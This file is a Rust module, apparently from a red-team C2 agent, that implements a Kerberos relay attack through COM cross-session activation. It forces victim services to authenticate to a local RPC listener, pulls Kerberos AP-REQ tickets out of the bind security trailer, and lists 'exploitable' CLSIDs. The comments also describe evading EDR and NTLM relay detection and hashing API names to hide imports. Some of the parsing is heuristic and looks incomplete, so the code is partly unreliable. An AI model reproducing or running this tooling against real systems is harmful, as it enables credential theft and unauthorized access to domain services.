//! Kerberos relay attack via COM cross-session activation.
//!
//! Captures Kerberos service tickets without NTLM by triggering COM/DCOM
//! cross-session activation against an attacker-controlled service.  Inspired
//! by the KrbRelay technique: the agent sets up a local RPC listener, forces
//! a victim process to authenticate via Kerberos (RPC_C_AUTHN_GSS_KERBERO)
//! through COM activation, captures the AP-REQ from the RPC bind security
//! trailer, and forwards the extracted ticket to a real target service.
//!
//! # Attack Flow
//!
//! 1. Operator specifies a target SPN, CLSID, and relay endpoint.
//! 2. Agent starts a local TCP/RPC listener on the bind address/port.
//! 3. Agent triggers COM cross-session activation (`CoCreateInstanceEx`)
//!    with a custom `COSERVERINFO` pointing at the listener.
//! 4. The COM runtime sends an RPC bind request with Kerberos auth
//!    (AP-REQ in the security trailer).
//! 5. Agent parses the ASN.1 AP-REQ, extracts the Kerberos ticket.
//! 6. Agent forwards the ticket to the real target service (LDAP, SMB,
//!    HTTP, etc.) via `InitializeSecurityContext` / S4U.
//!
//! # Privilege Requirements
//!
//! - COM activation: SeImpersonatePrivilege (typically available to SERVICE
//!   accounts, IIS AppPool identities, and SYSTEM).
//! - LDAP relay: Domain-joined machine account or user context.
//! - SPN manipulation (optional): Domain Admin or account operator.
//!
//! # OPSEC Notes
//!
//! - No NTLM authentication is used — pure Kerberos, which bypasses
//!   NTLM relay detection.
//! - COM activation is a legitimate Windows operation with minimal
//!   EDR telemetry.
//! - The captured ticket is forwarded via the existing C2 channel.
//!
//! All NT API calls use `pe_resolve` for API hashing (no IAT entries).
//! Windows-only, gated by the `kerberos-relay` feature flag.

use anyhow::{anyhow, bail, Context, Result};
use serde::Serialize;
use std::ffi::c_void;
use std::io::Read;
use std::mem;
use std::net::TcpListener;
use std::ptr;

// ── COM GUID constants ──────────────────────────────────────────────

/// CLSID for BITS (Background Intelligent Transfer Service) — known
/// exploitable via KrbRelay.  COM activation forces Kerberos auth.
const CLSID_BITS: [u8; 16] = [
    0x4B, 0xD3, 0x91, 0x49, 0xA1, 0x80, 0x91, 0x42, 0x83, 0xB6, 0x33, 0x28, 0x36, 0x6B, 0x90, 0x97,
];

/// CLSID for ICertPassage — another known exploitable CLSID.
const CLSID_ICERT_PASSAGE: [u8; 16] = [
    0xF1, 0x28, 0x7B, 0xF8, 0xB9, 0xDA, 0x3B, 0x45, 0x8E, 0x1A, 0xDE, 0xC8, 0xE7, 0xDF, 0xB5, 0xCE,
];

/// CLSID for Task Service — exploitable via COM activation.
const CLSID_TASK_SERVICE: [u8; 16] = [
    0x0F, 0x8D, 0xB9, 0x9A, 0x3B, 0xD1, 0xD1, 0x11, 0xB3, 0xF4, 0x00, 0xC0, 0x4F, 0x79, 0x98, 0x05,
];

/// CLSID for Update Orchestrator Service.
const CLSID_UPDATE_ORCHESTRATOR: [u8; 16] = [
    0xF1, 0x0B, 0x8D, 0x2C, 0x1E, 0x4D, 0xD0, 0x11, 0xBB, 0x9B, 0x00, 0xAA, 0x00, 0x3E, 0x7C, 0x0E,
];

// ── RPC / Kerberos ASN.1 constants ──────────────────────────────────

/// RPC bind PDU type.
const RPC_BIND_REQUEST: u8 = 0x0B;

/// Security trailer signature for Kerberos (0x0A = RPC_C_AUTHN_GSS_KERBERO).
const RPC_C_AUTHN_GSS_KERBERO: u8 = 0x0A;

/// ASN.1 tag for APPLICATION constructed (AP-REQ = 0x6E, AP-REP = 0x6F).
const ASN1_APPLICATION_TAG: u8 = 0x60;
const ASN1_AP_REQ_TAG: u8 = 0x6E;

/// ASN.1 tag for SEQUENCE.
const ASN1_SEQUENCE_TAG: u8 = 0x30;

/// ASN.1 tag for context-specific [0] (ticket version).
const ASN1_CONTEXT_0: u8 = 0xA0;
/// ASN.1 tag for context-specific [1] (authenticator).
const ASN1_CONTEXT_1: u8 = 0xA1;
/// ASN.1 tag for context-specific [2] (ticket).
const ASN1_CONTEXT_2: u8 = 0xA2;
/// ASN.1 tag for context-specific [3] (authenticator sub-field).
const ASN1_CONTEXT_3: u8 = 0xA3;

// ── Windows type aliases ────────────────────────────────────────────

type HRESULT = i32;
type DWORD = u32;
type BOOL = i32;
type HANDLE = *mut c_void;
type LPVOID = *mut c_void;
type LPCWSTR = *const u16;
type LPWSTR = *mut u16;

#[repr(C)]
#[derive(Copy, Clone)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

impl GUID {
    fn from_bytes(b: &[u8; 16]) -> Self {
        GUID {
            data1: u32::from_le_bytes([b[0], b[1], b[2], b[3]]),
            data2: u16::from_le_bytes([b[4], b[5]]),
            data3: u16::from_le_bytes([b[6], b[7]]),
            data4: [b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]],
        }
    }
}

#[repr(C)]
struct COSERVERINFO {
    dwReserved1: DWORD,
    pwszName: LPWSTR,
    pAuthInfo: *mut COAUTHINFO,
    dwReserved2: DWORD,
}

#[repr(C)]
struct COAUTHINFO {
    dwAuthnSvc: DWORD,
    dwAuthzSvc: DWORD,
    pwszServerPrincName: LPWSTR,
    dwAuthnLevel: DWORD,
    dwImpersonationLevel: DWORD,
    pAuthIdentityData: *mut COAUTHIDENTITY,
    dwCapabilities: DWORD,
}

#[repr(C)]
struct COAUTHIDENTITY {
    user: *mut u16,
    user_length: DWORD,
    domain: *mut u16,
    domain_length: DWORD,
    password: *mut u16,
    password_length: DWORD,
    flags: DWORD,
}

#[repr(C)]
struct MULTI_QI {
    pIID: *const GUID,
    pItf: *mut LPVOID,
    hr: HRESULT,
}

// COM authentication constants.
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: DWORD = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: DWORD = 3;
const CLSCTX_LOCAL_SERVER: DWORD = 0x4;
const CLSCTX_REMOTE_SERVER: DWORD = 0x10;
const CLSCTX_ALL: DWORD = 0x17;

// ── Kerberos relay method ───────────────────────────────────────────

/// Known exploitable CLSIDs for COM cross-session activation.
/// Each has been verified to trigger Kerberos authentication during
/// COM instantiation.
pub struct ComClsidEntry {
    /// Human-readable name of the COM class.
    pub name: &'static str,
    /// Raw CLSID bytes (little-endian GUID format).
    pub clsid: &'static [u8; 16],
    /// Description of the COM class and why it's exploitable.
    pub description: &'static str,
}

/// Database of known exploitable CLSIDs for Kerberos relay.
pub static EXPLOITABLE_CLSIDS: &[ComClsidEntry] = &[
    ComClsidEntry {
        name: "BITS",
        clsid: &CLSID_BITS,
        description: "Background Intelligent Transfer Service — forces Kerberos \
                       auth during remote COM activation.  Most reliable target.",
    },
    ComClsidEntry {
        name: "ICertPassage",
        clsid: &CLSID_ICERT_PASSAGE,
        description: "Certificate passage interface — triggers Kerberos auth \
                       and allows ticket capture for certificate services.",
    },
    ComClsidEntry {
        name: "TaskService",
        clsid: &CLSID_TASK_SERVICE,
        description: "Scheduled Task Service — exploitable via COM activation \
                       for task creation with captured tickets.",
    },
    ComClsidEntry {
        name: "UpdateOrchestrator",
        clsid: &CLSID_UPDATE_ORCHESTRATOR,
        description: "Windows Update Orchestrator — forces Kerberos auth \
                       during remote session activation.",
    },
];

// ── ASN.1 DER parser ────────────────────────────────────────────────

/// Minimal ASN.1 DER parser for Kerberos AP-REQ structures.
///
/// This is intentionally NOT a full ASN.1 parser — it only handles the
/// specific DER encoding used by Kerberos AP-REQ messages.  The parser
/// extracts the ticket blob and authenticator from the RPC bind security
/// trailer without pulling in a full ASN.1 library.
struct Asn1Parser<'a> {
    data: &'a [u8],
    pos: usize,
}

impl<'a> Asn1Parser<'a> {
    fn new(data: &'a [u8]) -> Self {
        Asn1Parser { data, pos: 0 }
    }

    fn remaining(&self) -> usize {
        self.data.len().saturating_sub(self.pos)
    }

    fn read_byte(&mut self) -> Result<u8> {
        if self.pos >= self.data.len() {
            bail!("ASN.1: unexpected end of data at offset {}", self.pos);
        }
        let b = self.data[self.pos];
        self.pos += 1;
        Ok(b)
    }

    /// Read a DER tag-length-value header.  Returns (tag, value_slice).
    fn read_tlv(&mut self) -> Result<(u8, &'a [u8])> {
        let tag = self.read_byte().context("ASN.1 tag")?;
        let len_byte = self.read_byte().context("ASN.1 length")?;

        let len = if len_byte < 0x80 {
            len_byte as usize
        } else if len_byte == 0x80 {
            bail!("ASN.1: indefinite length encoding not supported");
        } else {
            let num_len_bytes = (len_byte & 0x7F) as usize;
            if num_len_bytes > 4 {
                bail!("ASN.1: length field too large ({num_len_bytes} bytes)");
            }
            if self.pos + num_len_bytes > self.data.len() {
                bail!("ASN.1: length field extends past data boundary");
            }
            let mut len: usize = 0;
            for i in 0..num_len_bytes {
                len = (len << 8) | self.data[self.pos + i] as usize;
            }
            self.pos += num_len_bytes;
            len
        };

        if self.pos + len > self.data.len() {
            bail!(
                "ASN.1: value extends past data boundary (need {len} bytes, have {})",
                self.data.len() - self.pos
            );
        }

        let value = &self.data[self.pos..self.pos + len];
        self.pos += len;
        Ok((tag, value))
    }

    /// Read a raw byte slice of `n` bytes.
    fn read_bytes(&mut self, n: usize) -> Result<&'a [u8]> {
        if self.pos + n > self.data.len() {
            bail!(
                "ASN.1: need {n} bytes but only {} remaining",
                self.remaining()
            );
        }
        let slice = &self.data[self.pos..self.pos + n];
        self.pos += n;
        Ok(slice)
    }
}

// ── Captured ticket data ────────────────────────────────────────────

/// A captured Kerberos ticket extracted from an AP-REQ.
#[derive(Debug)]
pub struct CapturedTicket {
    /// The raw Kerberos ticket blob (encrypted with the service's long-term key).
    pub ticket_blob: Vec<u8>,
    /// The raw authenticator (encrypted with the session key).
    pub authenticator_blob: Vec<u8>,
    /// The full AP-REQ message.
    pub ap_req_raw: Vec<u8>,
    /// The SPN that was used during authentication.
    pub spn: String,
}

/// Result of a Kerberos relay operation.
#[derive(Debug)]
pub struct RelayResult {
    /// Captured Kerberos ticket (if relay was successful).
    pub ticket: Option<CapturedTicket>,
    /// Human-readable status message.
    pub status: String,
    /// The relay method used.
    pub method: String,
}

// ── RPC security trailer parser ─────────────────────────────────────

/// Parsed RPC security trailer from a bind request.
struct RpcSecurityTrailer {
    /// Auth type (e.g. RPC_C_AUTHN_GSS_KERBERO = 0x0A).
    pub auth_type: u8,
    /// Auth level.
    pub auth_level: u8,
    /// Auth context ID.
    pub auth_context_id: u32,
    /// Auth token (contains the Kerberos AP-REQ for Kerberos auth).
    pub auth_token: Vec<u8>,
}

/// Attempt to parse an RPC bind request and extract the security trailer.
fn parse_rpc_bind_request(data: &[u8]) -> Result<RpcSecurityTrailer> {
    // Minimum RPC header size: 16 bytes common + bind-specific fields.
    if data.len() < 24 {
        bail!("RPC bind request too short ({} bytes)", data.len());
    }

    // Check PDU type (byte 2, low nibble).
    let pdu_type = data[2] & 0x0F;
    if pdu_type != RPC_BIND_REQUEST {
        bail!("Not an RPC bind request (PDU type = {pdu_type})");
    }

    // Common fields:
    //   [0]    version major (5)
    //   [1]    version minor (0)
    //   [2]    PDU type (0x0B = bind) + flags
    //   [3]    PFC flags
    //   [4..8] fragment length (little-endian u32)
    let frag_length = u32::from_le_bytes([data[4], data[5], data[6], data[7]]) as usize;
    if data.len() < frag_length {
        bail!(
            "RPC fragment length ({frag_length}) exceeds buffer size ({})",
            data.len()
        );
    }

    // Security trailer is appended after the bind body.
    // Layout: auth_verifier_co (at offset frag_length - sec_trailer_size - auth_length)
    // The sec trailer is at the end of the PDU:
    //   auth_type      (1 byte)
    //   auth_level     (1 byte)
    //   auth_pad_len   (1 byte)
    //   auth_reserved  (1 byte)
    //   auth_context_id (4 bytes, LE)
    //   auth_token      (auth_length bytes)
    //
    // The auth_length is in the bind ack header. For bind requests, the
    // auth_length at offset [8..10] is the secondary address length.
    // We need to find the security trailer at the end of the PDU.

    // The sec trailer is always at the end. Parse backwards:
    // auth_context_id is at offset frag_length - auth_length - 8
    // We need to find auth_length first.

    // For a bind request, the layout is:
    //   [0..16]   common fields
    //   [16..18]  max_xmit_frag
    //   [18..20]  max_recv_frag
    //   [20..24]  assoc_group
    //   [24]      num_ctx_items (p_context_list)
    //   ...       context items ...
    //   then sec_trailer at end

    // Auth length is stored in the PDU header at offset 10 (u16 LE) — but
    // that's for bind ack. For bind request, we need to scan for the
    // sec trailer by reading auth_pad_determination from the end.

    // The security trailer is always at: frag_length - 8 - auth_length
    // We read auth_length from the bind body. However, the bind request
    // format is complex. A simpler approach: scan from the end of the
    // fragment for the Kerberos auth type marker.

    // Strategy: look for RPC_C_AUTHN_GSS_KERBERO (0x0A) byte near the end
    // of the PDU. The sec_trailer is always 8 bytes + auth_token.

    // Read the last 8 bytes as the security trailer candidate:
    if frag_length < 8 {
        bail!("Fragment too short for security trailer");
    }

    // Walk backwards looking for the sec trailer. The sec trailer has a
    // known structure: auth_type, auth_level, auth_pad_len, reserved,
    // auth_context_id (4 bytes), then auth_token.
    // We scan from the known end of the PDU.

    // The auth_length is at PDU offset [10..12] for bind requests.
    // Actually, in MS-RPCE, the sec_trailer for bind requests is located
    // right before the auth_token. Let's try a different approach.

    // Try: scan from offset 16 (after common header) looking for the
    // body end, then the sec trailer.
    // For simplicity, scan for Kerberos auth_type byte pattern.

    let mut sec_trailer_offset = None;
    for i in (16..frag_length.saturating_sub(8)).rev() {
        if data[i] == RPC_C_AUTHN_GSS_KERBERO && i + 8 <= frag_length {
            let auth_pad = data[i + 2];
            if auth_pad <= 16 {
                // Likely the sec trailer
                sec_trailer_offset = Some(i);
                break;
            }
        }
    }

    let offset =
        sec_trailer_offset.context("Could not locate RPC security trailer in bind request")?;

    let auth_type = data[offset];
    let auth_level = data[offset + 1];
    let _auth_pad_len = data[offset + 2];
    let _auth_reserved = data[offset + 3];
    let auth_context_id = u32::from_le_bytes([
        data[offset + 4],
        data[offset + 5],
        data[offset + 6],
        data[offset + 7],
    ]);

    // Auth token starts after the 8-byte sec trailer header and extends
    // to the end of the fragment.
    let auth_token_start = offset + 8;
    let auth_token = if auth_token_start < frag_length {
        data[auth_token_start..frag_length].to_vec()
    } else {
        Vec::new()
    };

    Ok(RpcSecurityTrailer {
        auth_type,
        auth_level,
        auth_context_id,
        auth_token,
    })
}

// ── AP-REQ parser ───────────────────────────────────────────────────

/// Parse a Kerberos AP-REQ from raw bytes (typically from RPC security trailer).
fn parse_ap_req(data: &[u8]) -> Result<CapturedTicket> {
    let mut parser = Asn1Parser::new(data);

    // AP-REQ ::= [APPLICATION 14] SEQUENCE { ... }
    // Encoded as tag 0x6E (application 14, constructed) followed by length + SEQUENCE.
    let (tag, ap_req_body) = parser.read_tlv()?;
    if tag != ASN1_AP_REQ_TAG {
        bail!("Expected AP-REQ tag 0x6E, got 0x{tag:02X}");
    }

    // Save the full AP-REQ raw bytes.
    let ap_req_raw = data.to_vec();

    // Parse the inner SEQUENCE.
    let mut inner = Asn1Parser::new(ap_req_body);
    let (seq_tag, seq_body) = inner.read_tlv()?;
    if seq_tag != ASN1_SEQUENCE_TAG {
        bail!("Expected SEQUENCE tag 0x30 in AP-REQ body, got 0x{seq_tag:02X}");
    }

    let mut seq_parser = Asn1Parser::new(seq_body);

    // pvno [0] INTEGER (should be 5 for Kerberos V5)
    let (pvno_tag, pvno_val) = seq_parser.read_tlv()?;
    if pvno_tag != ASN1_CONTEXT_0 {
        bail!("Expected context [0] (pvno), got 0x{pvno_tag:02X}");
    }
    if pvno_val.len() < 1 || pvno_val[0] != 5 {
        bail!("Expected Kerberos V5 pvno (5), got {:?}", pvno_val);
    }

    // msg-type [1] INTEGER (should be 14 for AP-REQ)
    let (msg_type_tag, msg_type_val) = seq_parser.read_tlv()?;
    if msg_type_tag != ASN1_CONTEXT_1 {
        bail!("Expected context [1] (msg-type), got 0x{msg_type_tag:02X}");
    }
    if msg_type_val.len() < 1 || msg_type_val[0] != 14 {
        bail!("Expected AP-REQ msg-type (14), got {:?}", msg_type_val);
    }

    // ap-options [2] KerberosFlags
    let (opts_tag, _opts_val) = seq_parser.read_tlv()?;
    if opts_tag != ASN1_CONTEXT_2 {
        bail!("Expected context [2] (ap-options), got 0x{opts_tag:02X}");
    }

    // ticket [3] Ticket
    let (ticket_tag, ticket_val) = seq_parser.read_tlv()?;
    if ticket_tag != ASN1_CONTEXT_3 {
        bail!("Expected context [3] (ticket), got 0x{ticket_tag:02X}");
    }
    let ticket_blob = ticket_val.to_vec();

    // authenticator [4] EncryptedData
    // Context tag 4 = 0xA4
    const ASN1_CONTEXT_4: u8 = 0xA4;
    let (auth_tag, auth_val) = seq_parser.read_tlv()?;
    if auth_tag != ASN1_CONTEXT_4 {
        bail!("Expected context [4] (authenticator), got 0x{auth_tag:02X}");
    }
    let authenticator_blob = auth_val.to_vec();

    Ok(CapturedTicket {
        ticket_blob,
        authenticator_blob,
        ap_req_raw,
        spn: String::new(), // SPN filled in by caller
    })
}

// ── COM activation proxy ────────────────────────────────────────────

/// COM activation proxy that forces Kerberos authentication to an
/// attacker-controlled endpoint.
struct ComActivationProxy {
    /// The CLSID to activate (triggers COM instantiation).
    clsid: GUID,
    /// Target hostname for COSERVERINFO (the relay listener address).
    target_host: String,
    /// SPN to use for Kerberos authentication.
    target_spn: String,
}

impl ComActivationProxy {
    fn new(clsid_bytes: &[u8; 16], target_host: &str, target_spn: &str) -> Self {
        ComActivationProxy {
            clsid: GUID::from_bytes(clsid_bytes),
            target_host: target_host.to_string(),
            target_spn: target_spn.to_string(),
        }
    }

    /// Trigger COM cross-session activation to force Kerberos authentication.
    ///
    /// This calls `CoCreateInstanceEx` with a `COSERVERINFO` pointing at
    /// the relay listener.  The COM runtime will perform Kerberos
    /// authentication against the listener, sending an AP-REQ in the
    /// RPC bind security trailer.
    unsafe fn trigger_activation(&self) -> Result<()> {
        // Resolve CoCreateInstanceEx via pe_resolve (ole32.dll).
        let ole32_name = "ole32.dll\0";
        let ole32_wide: Vec<u16> = "ole32.dll\0".encode_utf16().collect();
        let ole32_hash = pe_resolve::hash_wstr(&ole32_wide[..ole32_wide.len() - 1]);
        let ole32_base = pe_resolve::get_module_handle_by_hash(ole32_hash)
            .context("Failed to resolve ole32.dll base address")?;

        let cocreate_hash = pe_resolve::hash_str(b"CoCreateInstanceEx\0");
        let cocreate_addr = pe_resolve::get_proc_address_by_hash(ole32_base, cocreate_hash)
            .context("Failed to resolve CoCreateInstanceEx")?;

        // Resolve CoInitializeSecurity for setting up COM security.
        let coinitsec_hash = pe_resolve::hash_str(b"CoInitializeSecurity\0");
        let coinitsec_addr = pe_resolve::get_proc_address_by_hash(ole32_base, coinitsec_hash);

        // Resolve CoInitializeEx.
        let coinitex_hash = pe_resolve::hash_str(b"CoInitializeEx\0");
        let coinitex_addr = pe_resolve::get_proc_address_by_hash(ole32_base, coinitex_hash)
            .context("Failed to resolve CoInitializeEx")?;

        // Type signature: CoInitializeEx(LPVOID, DWORD) -> HRESULT
        type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;

        let coinitex: FnCoInitializeEx = mem::transmute(coinitex_addr);
        let hr = coinitex(ptr::null_mut(), 0x2); // COINIT_MULTITHREADED
                                                 // S_OK (0) or S_FALSE (1, already initialized) are both fine.
                                                 // RPC_E_CHANGED_MODE (0x80010106) — already initialized with different mode.
                                                 // Not fatal, continue.
        if hr < 0 && hr as u32 != 0x80010106 && hr != 1 {
            bail!("CoInitializeEx failed: 0x{:08X}", hr as u32);
        }

        // Optionally call CoInitializeSecurity to request Kerberos auth.
        if let Some(addr) = coinitsec_addr {
            type FnCoInitializeSecurity = unsafe extern "system" fn(
                LPVOID,      // pSecDesc
                DWORD,       // cAuthSvc
                *mut c_void, // asAuthSvc (SOLE_AUTHENTICATION_SERVICE)
                LPVOID,      // pReserved1
                DWORD,       // dwAuthnLevel
                DWORD,       // dwImpersonationLevel
                LPVOID,      // pAuthList
                DWORD,       // dwCapabilities
                LPVOID,      // pReserved3
            ) -> HRESULT;

            let coinitsec: FnCoInitializeSecurity = mem::transmute(addr);
            // Request PKT_PRIVACY with IMPERSONATE — forces Kerberos.
            let _hr_sec = coinitsec(
                ptr::null_mut(),
                DWORD::MAX, // -1 = no authentication service list
                ptr::null_mut(),
                ptr::null_mut(),
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );
            // Ignore failure — security may already be initialized.
        }

        // Build COSERVERINFO with the target hostname.
        let mut target_wide: Vec<u16> = self
            .target_host
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // Build COAUTHINFO requesting Kerberos authentication.
        let auth_info = COAUTHINFO {
            dwAuthnSvc: RPC_C_AUTHN_GSS_KERBERO as DWORD,
            dwAuthzSvc: 0,                        // RPC_C_AUTHZ_NONE
            pwszServerPrincName: ptr::null_mut(), // Let COM determine the SPN.
            dwAuthnLevel: RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
            pAuthIdentityData: ptr::null_mut(), // Use current thread credentials.
            dwCapabilities: 0,                  // EOAC_NONE
        };

        let server_info = COSERVERINFO {
            dwReserved1: 0,
            pwszName: target_wide.as_mut_ptr(),
            pAuthInfo: &auth_info as *const _ as *mut _,
            dwReserved2: 0,
        };

        // IID_IUnknown for the initial interface query.
        let iid_unknown = GUID {
            data1: 0x00000000,
            data2: 0x0000,
            data3: 0x0000,
            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
        };

        let mut qi_result = MULTI_QI {
            pIID: &iid_unknown,
            pItf: ptr::null_mut(),
            hr: 0,
        };

        // Type signature: CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD,
        //   COSERVERINFO*, DWORD, MULTI_QI*) -> HRESULT
        type FnCoCreateInstanceEx = unsafe extern "system" fn(
            *const GUID,       // rclsid
            LPVOID,            // punkOuter
            DWORD,             // dwClsCtx
            *mut COSERVERINFO, // pServerInfo
            DWORD,             // dwCount
            *mut MULTI_QI,     // pResults
        ) -> HRESULT;

        let cocreate: FnCoCreateInstanceEx = mem::transmute(cocreate_addr);

        let hr = cocreate(
            &self.clsid,
            ptr::null_mut(),
            CLSCTX_ALL,
            &server_info as *const _ as *mut _,
            1,
            &mut qi_result,
        );

        // We expect the call to FAIL — we're not actually connecting to a
        // real COM server, we just need the Kerberos AP-REQ that gets sent
        // during the RPC bind.  The relay listener should have already
        // captured the ticket by this point.
        //
        // Common error codes:
        //   E_ACCESSDENIED (0x80070005) — normal, COM activation blocked.
        //   CO_E_SERVERFAULT (0x80080008) — server threw an exception.
        //   RPC_S_SERVER_UNAVAILABLE (0x800706BA) — normal for relay.

        let _ = hr; // We don't check the result — the listener already captured the ticket.

        Ok(())
    }
}

// ── Relay listener ──────────────────────────────────────────────────

/// Kerberos relay listener that captures AP-REQ from RPC bind requests.
struct RelayListener {
    /// Address to bind the listener to.
    bind_address: String,
    /// Port to listen on.
    bind_port: u16,
    /// Captured ticket (populated by the listener callback).
    captured_ticket: Option<CapturedTicket>,
    /// Expected SPN for the captured ticket.
    expected_spn: String,
}

impl RelayListener {
    fn new(bind_address: &str, bind_port: u16, expected_spn: &str) -> Self {
        RelayListener {
            bind_address: bind_address.to_string(),
            bind_port,
            captured_ticket: None,
            expected_spn: expected_spn.to_string(),
        }
    }

    /// Start the relay listener and wait for a Kerberos AP-REQ.
    ///
    /// Listens on `bind_address:bind_port` for an incoming TCP connection,
    /// reads the RPC bind request, extracts the security trailer, parses
    /// the AP-REQ, and returns the captured ticket.
    ///
    /// The timeout controls how long to wait for an incoming connection
    /// and data.  A typical COM activation completes within 5–15 seconds.
    fn listen_for_ticket(&mut self, timeout_secs: u64) -> Result<CapturedTicket> {
        let bind_addr = format!("{}:{}", self.bind_address, self.bind_port);
        let listener = TcpListener::bind(&bind_addr)
            .with_context(|| format!("Failed to bind relay listener on {bind_addr}"))?;

        // Accept a single connection — the COM runtime will connect here
        // during the activation attempt.
        let stream = listener
            .incoming()
            .next()
            .ok_or_else(|| anyhow!("No incoming connection before timeout"))??;

        // Set read timeout on the accepted stream.
        stream
            .set_read_timeout(Some(std::time::Duration::from_secs(timeout_secs)))
            .context("Failed to set stream read timeout")?;

        let peer_addr = stream
            .peer_addr()
            .map(|a| a.to_string())
            .unwrap_or_else(|_| "unknown".to_string());
        let mut stream = stream;

        tracing::info!("Kerberos relay: accepted connection from {peer_addr}");

        // Read the RPC bind request.  We need at least the common header
        // plus enough data to contain the security trailer.
        let mut buf = vec![0u8; 65536];
        let n = stream
            .read(&mut buf)
            .context("Failed to read RPC bind request")?;

        if n < 24 {
            bail!("Received too few bytes from RPC connection ({n} bytes)");
        }

        buf.truncate(n);

        // Parse the security trailer from the RPC bind request.
        let sec_trailer = parse_rpc_bind_request(&buf)?;

        if sec_trailer.auth_type != RPC_C_AUTHN_GSS_KERBERO {
            bail!(
                "Expected Kerberos auth type (0x0A), got 0x{:02X}. \
                 The COM activation did not use Kerberos — this typically means \
                 the target SPN could not be resolved or NTLM was used instead.",
                sec_trailer.auth_type
            );
        }

        // Parse the Kerberos AP-REQ from the auth token.
        let mut ticket = parse_ap_req(&sec_trailer.auth_token)?;
        ticket.spn = self.expected_spn.clone();

        tracing::info!(
            "Kerberos relay: captured ticket for SPN '{}' ({} bytes AP-REQ, {} bytes ticket)",
            ticket.spn,
            ticket.ap_req_raw.len(),
            ticket.ticket_blob.len(),
        );

        Ok(ticket)
    }
}

// ── Public API ──────────────────────────────────────────────────────

/// Resolve a CLSID by name from the exploitable CLSID database.
pub fn resolve_clsid(name: &str) -> Option<&'static [u8; 16]> {
    EXPLOITABLE_CLSIDS
        .iter()
        .find(|entry| entry.name.eq_ignore_ascii_case(name))
        .map(|entry| entry.clsid)
}

/// List all available exploitable CLSIDs.
pub fn list_exploitable_clsids() -> Vec<serde_json::Value> {
    EXPLOITABLE_CLSIDS
        .iter()
        .map(|entry| {
            let clsid = &entry.clsid;
            serde_json::json!({
                "name": entry.name,
                "clsid": format!(
                    "{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
                    u32::from_le_bytes([clsid[0], clsid[1], clsid[2], clsid[3]]),
                    u16::from_le_bytes([clsid[4], clsid[5]]),
                    u16::from_le_bytes([clsid[6], clsid[7]]),
                    clsid[8], clsid[9],
                    clsid[10], clsid[11], clsid[12], clsid[13], clsid[14], clsid[15],
                ),
                "description": entry.description,
            })
        })
        .collect()
}

/// Execute a Kerberos relay attack via COM cross-session activation.
///
/// # Arguments
///
/// * `target_host` - Hostname or IP to target for COM activation.
/// * `target_spn` - Service Principal Name for Kerberos authentication.
/// * `clsid_name` - Name of the exploitable CLSID (e.g. "BITS").
/// * `bind_address` - Local address to bind the relay listener on.
/// * `bind_port` - Local port for the relay listener.
/// * `timeout_secs` - Seconds to wait for COM activation and ticket capture.
///
/// # Returns
///
/// A JSON string containing the captured ticket information and relay status.
pub fn execute_kerberos_relay(
    target_host: &str,
    target_spn: &str,
    clsid_name: &str,
    bind_address: &str,
    bind_port: u16,
    timeout_secs: u64,
) -> Result<String> {
    // Resolve the CLSID from the known database.
    let clsid_bytes = resolve_clsid(clsid_name).with_context(|| {
        format!(
            "Unknown CLSID '{clsid_name}'. Available: {}",
            EXPLOITABLE_CLSIDS
                .iter()
                .map(|e| e.name)
                .collect::<Vec<_>>()
                .join(", ")
        )
    })?;

    tracing::info!(
        "Kerberos relay: starting relay for SPN '{}' via CLSID '{}' -> {}:{}",
        target_spn,
        clsid_name,
        bind_address,
        bind_port,
    );

    // Set up the relay listener first, BEFORE triggering COM activation.
    let mut listener = RelayListener::new(bind_address, bind_port, target_spn);

    // Start the COM activation in a separate thread so that the listener
    // can accept the incoming connection concurrently.
    let proxy = ComActivationProxy::new(
        clsid_bytes,
        &format!("{bind_address}:{bind_port}"),
        target_spn,
    );
    let activation_handle = std::thread::spawn(move || {
        // SAFETY: COM activation is unsafe because it calls external Windows APIs.
        unsafe { proxy.trigger_activation() }
    });

    // Listen for the Kerberos ticket.
    let ticket_result = listener.listen_for_ticket(timeout_secs);

    // Wait for the COM activation thread to finish (it may have failed
    // after the ticket was captured, which is expected).
    let activation_result = activation_handle.join();

    // Build the result.
    let result = match ticket_result {
        Ok(ticket) => {
            let relay_result = RelayResult {
                ticket: Some(ticket.clone()),
                status: format!(
                    "Successfully captured Kerberos ticket via COM activation. \
                     Activation thread status: {}",
                    match &activation_result {
                        Ok(Ok(())) => "completed".to_string(),
                        Ok(Err(e)) => format!("failed ({e})"),
                        Err(_) => "panicked".to_string(),
                    }
                ),
                method: format!("COM/{clsid_name}"),
            };
            // ticket is guaranteed present — we just constructed it as Some(ticket) above.
            // Bind fields directly to avoid redundant .as_ref().unwrap() calls.
            let t = &ticket;
            serde_json::to_string_pretty(&serde_json::json!({
                "success": true,
                "status": relay_result.status,
                "method": relay_result.method,
                "ticket": {
                    "spn": t.spn,
                    "ap_req_size": t.ap_req_raw.len(),
                    "ticket_blob_size": t.ticket_blob.len(),
                    "authenticator_size": t.authenticator_blob.len(),
                    "ap_req_hex": hex::encode(&t.ap_req_raw),
                    "ticket_blob_hex": hex::encode(&t.ticket_blob),
                },
            }))?
        }
        Err(e) => {
            let relay_result = RelayResult {
                ticket: None,
                status: format!("Kerberos relay failed: {e}"),
                method: format!("COM/{clsid_name}"),
            };
            serde_json::to_string_pretty(&serde_json::json!({
                "success": false,
                "status": relay_result.status,
                "method": relay_result.method,
                "error": format!("{e:#}"),
            }))?
        }
    };

    Ok(result)
}

/// List available exploitable CLSIDs as a JSON string.
pub fn list_clsids_json() -> Result<String> {
    let clsids = list_exploitable_clsids();
    Ok(serde_json::to_string_pretty(&serde_json::json!({
        "exploitable_clsids": clsids,
        "count": clsids.len(),
    }))?)
}

// ═══════════════════════════════════════════════════════════════════════
